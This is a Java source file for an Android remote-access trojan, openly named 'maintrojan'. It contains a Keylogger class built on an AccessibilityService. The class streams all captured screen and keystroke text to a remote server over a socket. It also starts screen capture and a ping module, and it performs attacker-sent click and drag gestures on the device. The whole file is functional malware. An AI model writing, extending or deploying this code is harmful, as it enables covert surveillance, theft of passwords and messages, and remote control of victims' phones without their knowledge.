package com.example.maintrojan;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.logging.LogRecord;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class Keylogger extends AccessibilityService {
    private static boolean START = false;
    final String TAG = "myTrojan";
    public static boolean SCOKET_FLAG = true;
    private String sockEvt = "logger";
    private Socket sock;
    public static Intent intent;
    public static int resCode;
    public Handler handler = new Handler();
    public Handler gestureHandler = new Handler();

    public static void start(){
        START = true;
    }
    public static void stop(){
        START = false;
    }

    private String charToString(List<CharSequence> cs){
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : cs) sb.append(s);
        return sb.toString();
    }
    @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  click(float x, float y){
        Log.d(TAG, "dispatching event click "+x+" "+y);
        Path p = new Path();
        p.moveTo(x,y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,100,50));
        dispatchGesture(builder.build(),null,gestureHandler);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public  void  drag(float x1, float y1,float x2,float y2){
        Log.d(TAG, "dispatching event drag "+x1+" "+y1+" "+x2+" "+y2);
        Path p = new Path();
        p.moveTo(x1,y1);
        p.lineTo(x2,y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(p,100,100));
        dispatchGesture(builder.build(),null,gestureHandler);
    }

    @Override
    protected void onServiceConnected(){
//        Log.d(TAG,"[+] Connected "+START);
        if(START){
//            Log.d(TAG,"[+] Connected");
            if(SCOKET_FLAG){
                sock.emit(sockEvt,"[+] Connected");
            }
        }
        super.onServiceConnected();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent aEvt) {
        if(START) {
            String evts = charToString(aEvt.getText());
            if (!evts.equals("")) {
//                Log.d(TAG, evts);
                if (SCOKET_FLAG) {
                    sock.emit(sockEvt, evts);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        if(START){
            if (SCOKET_FLAG){
                sock.emit(sockEvt,"[-] Interrupt");
            }
//            Log.d(TAG,"[-] Interrupt");
        }

    }

    @Override
    public void onDestroy() {
        if(START){
            if (SCOKET_FLAG){
                if (SCOKET_FLAG){
                    sock.emit(sockEvt,"[-] Dissconnect");
                }
                sock.disconnect();
            }
//            Log.d(TAG,"[-] Dissconnect");
        }
        super.onDestroy();

    }

    @Override
    public void onCreate() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Connecting with server
                try {
                    Connecting.connect(getString(R.string.MY_IP),getString(R.string.MY_PORT),Integer.parseInt(getString(R.string.reconnectTime)));
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                sock = Connecting.getSock();

                // Setting up the Screen capture Module
                MediaProjectionManager mProjectionManager =  (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                MediaProjection mProjection = mProjectionManager.getMediaProjection(resCode,intent);
                Capture.setup(sock, getApplicationContext(), mProjection,handler,5);

                // Ping Handler
                sock.on("ping", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        try {
                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                            if(array.getString(0).equals("start")){
                                Pinger.changeVars(array.getString(1),array.getInt(2),array.getInt(3));
                                Pinger.start();
                            }else{
                                Pinger.stop();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });

                // Logger Handler
                sock.on("logger", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        try {
                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                            if(array.getString(0).equals("start")){
                                Keylogger.start();
                            }else{
                                Keylogger.stop();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });

                // Screen Handler
                sock.on("screen", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        try {
                            Log.d(TAG,(String)args[0] );
                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                            if(array.getString(0).equals("start")){
                                Capture.start();
                                Log.d(TAG, "starting");
                            }else{
                                Capture.stop();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });


                // Mouse Handler
                sock.on("mouse", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        try {
                            JSONObject data = (JSONObject) args[0];
//                            Log.d(TAG, ((JSONObject) args[0]).toString());
                            JSONObject values = new JSONObject(data.getString("points"));
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                if(data.getString("type").compareTo( "click") == 0){
                                    click(Float.parseFloat(values.getString("x")),Float.parseFloat(values.getString("y")));
                                }else{
                                    drag(Float.parseFloat(values.getString("x1")),Float.parseFloat(values.getString("y1")),Float.parseFloat(values.getString("x2")),Float.parseFloat(values.getString("y2")));
                                }
                            }
                        } catch (Exception e) {
                            Log.d(TAG, e.getMessage());
                        }
                    }
                });

            }
        }).start();
        super.onCreate();
    }
}
